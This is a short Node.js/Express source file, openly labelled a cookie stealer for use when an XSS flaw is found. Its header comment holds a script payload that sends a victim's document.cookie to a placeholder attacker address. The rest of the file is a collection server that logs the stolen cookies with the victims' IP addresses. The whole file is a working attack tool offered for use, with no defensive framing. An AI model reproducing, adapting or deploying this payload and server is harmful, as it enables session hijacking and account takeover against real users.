/*
Cookie stealer that you can use in the event of an XSS security vulnerability

Payload:

<script>
  fetch('http://X.X.X.X:XXXX/', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ cookies: document.cookie })
  });
</script>


Code by: @oglis22
*/

const bodyParser = require('body-parser');
const express = require('express');
const app = express();
const fs = require('fs');

console.log("Server is starting");

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.post("/", (req, res) => {
    const cookies = req.body.cookies;
    console.log(cookies);
    fs.writeFile("logs.txt", req.ip + " --> " + cookies, 'utf8', (err) => { if (err) console.log("There was an error while writing the logs (logs.txt)") });
});

if (app.listen(3000)) console.log("Server is running on port 3000");
else console.log("Server can not be started!");
